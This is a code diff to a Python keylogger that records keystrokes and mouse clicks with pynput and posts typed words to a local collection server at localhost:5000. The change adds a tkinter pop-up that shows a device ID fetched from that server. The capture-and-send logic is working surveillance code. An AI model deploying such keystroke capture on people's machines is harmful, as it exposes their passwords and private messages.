@@ -1,18 +1,56 @@
 import requests
 import socket
 from pynput import keyboard, mouse
+import tkinter as tk
+from tkinter import messagebox
 
 sentence_buffer = []
+device_name = None
 
-# def send_sentence(sentence):
-#     try:
-#         requests.post("http://localhost:5000/event", json={"word": sentence})
-#     except Exception as e:
-#         print("Error sending sentence:", e)
+def show_start_notification():
+    global device_name
+    try:
+        # Get device name from server
+        response = requests.get("http://localhost:5000/keylogger/get_unique_id")
+
+        if response.status_code == 200:
+            data = response.json()
+            device_name = data.get("devicename")
+
+            print("Device name from server:", device_name)
+
+            # Show GUI window with device name
+            def copy_and_close():
+                root.clipboard_clear()
+                root.clipboard_append(device_name)
+                root.update()  # now it stays on the clipboard
+                root.destroy()
+
+            root = tk.Tk()
+            root.title("Device ID Generated")
+            root.geometry("300x150")
+            root.resizable(False, False)
+
+            label = tk.Label(root, text="Your Device ID:", font=("Arial", 12))
+            label.pack(pady=10)
+
+            device_label = tk.Label(root, text=device_name, fg="blue", font=("Arial", 12, "bold"))
+            device_label.pack()
+
+            copy_button = tk.Button(root, text="Copy & Close", command=copy_and_close)
+            copy_button.pack(pady=15)
+
+            root.mainloop()
+
+        else:
+            print("Failed to get device name. Status code:", response.status_code)
+
+    except Exception as e:
+        print("Error during startup notification or device fetch:", e)
 
 def send_sentence(sentence):
+    global device_name
     try:
-        device_name = socket.gethostname()  # Get the device (host) name
         print(device_name)
         requests.post("http://localhost:5000/keylogger/event", json={
             "word": sentence,
@@ -44,6 +82,7 @@ def on_click(x, y, button, pressed):
         sentence_buffer = []
 
 if __name__ == "__main__":
+    show_start_notification()
     keyboard.Listener(on_press=on_press).start()
     mouse.Listener(on_click=on_click).start()
     while True:
